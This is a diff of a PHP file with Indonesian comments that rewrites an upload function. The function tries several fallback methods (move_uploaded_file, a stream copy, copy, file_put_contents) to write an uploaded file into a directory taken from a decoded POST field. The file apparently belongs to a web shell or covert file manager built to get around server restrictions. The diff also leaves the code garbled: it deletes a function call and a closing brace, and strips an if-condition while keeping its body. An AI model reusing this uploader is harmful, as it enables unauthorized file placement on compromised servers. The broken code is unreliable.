@@ -934,55 +934,62 @@ else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
             'message' => '',
             'name'    => ''
         ];
+        
         if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
-            $res['message'] = 'No file selected or upload error (error code: ' . (isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown') . ')';
+            $errCode = isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown';
+            $res['message'] = 'Upload error code: ' . $errCode;
             return $res;
         }
 
         $filename = basename($_FILES[$fileKey]['name']);
         $tmp      = $_FILES[$fileKey]['tmp_name'];
         $dest     = rtrim($targetDir, '/') . '/' . $filename;
-        // Method 1: move_uploaded_file()
+        
+        // Coba 1: move_uploaded_file (Standar)
         if (@move_uploaded_file($tmp, $dest)) {
             $res['success'] = true;
             $res['method'] = 'move_uploaded_file';
         }
-        // Method 2: copy()
+        // Coba 2: Stream Copy (SOLUSI ANTI 0KB & MEMORY LIMIT)
+        elseif ($in = @fopen($tmp, "rb")) {
+            if ($out = @fopen($dest, "wb")) {
+                while ($buff = fread($in, 4096)) {
+                    fwrite($out, $buff);
+                }
+                fclose($out);
+                $res['success'] = true;
+                $res['method'] = 'stream_copy';
+            }
+            fclose($in);
+        }
+        // Coba 3: copy() (Fallback sederhana)
         elseif (@copy($tmp, $dest)) {
-            @unlink($tmp);
             $res['success'] = true;
             $res['method'] = 'copy';
         }
-        // Method 3: file_get_contents + file_put_contents
+        // Coba 4: file_get_contents (Hanya untuk file kecil)
         elseif (($data = @file_get_contents($tmp)) !== false && @file_put_contents($dest, $data)) {
-            @unlink($tmp);
             $res['success'] = true;
             $res['method'] = 'file_get_contents';
         }
-        // Method 4: rename tmp to a temporary file, then copy
-        else {
-            $alt = sys_get_temp_dir() . '/' . uniqid('bypass_', true);
-            if (@rename($alt, $alt) && @copy($alt, $dest)) {
-                @unlink($alt);
-                $res['success'] = true;
-                $res['method'] = 'rename+copy';
-            }
-        }
 
+        // VALIDASI AKHIR: Pastikan file ada dan ukurannya > 0
         if ($res['success']) {
-            $res['name'] = $filename;
-            $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): <a href=\"" . htmlspecialchars($filename) . "\" target=\"_blank\">" . htmlspecialchars($filename) . "</a>";
+            if (file_exists($dest) && filesize($dest) > 0) {
+                @chmod($dest, 0644); // Coba set permission agar bisa dibaca
+                $res['name'] = $filename;
+                $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): <a href=\"" . htmlspecialchars($filename) . "\" target=\"_blank\">" . htmlspecialchars($filename) . "</a>";
+            } else {
+                $res['success'] = false;
+                $res['message'] = "Upload terdeteksi sukses tapi file kosong (0kb). Cek permission folder.";
+                @unlink($dest); // Hapus file kosong
+            }
         } else {
-            $res['message'] = "All upload methods failed, please check permissions or server restrictions.";
+            $res['message'] = "Gagal upload. Direktori mungkin tidak writeable atau fungsi diblokir.";
         }
 
         return $res;
     }
-
-    $uploadResult = smart_upload('ufile', $default_dir);
-    $upload_message = $uploadResult['message'];
-}
-
 
 ?>
 <?php
@@ -1011,9 +1018,7 @@ $msg = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Make sure the file has been uploaded without errors
-    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
-        $originalName = $_FILES['upload_file']['name'];
-        $filename = sanitizeFilename($originalName);
+   
         // Get the destination directory from the 'berkas' input
         if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
             $targetDir = uraikan($_POST['berkas']);
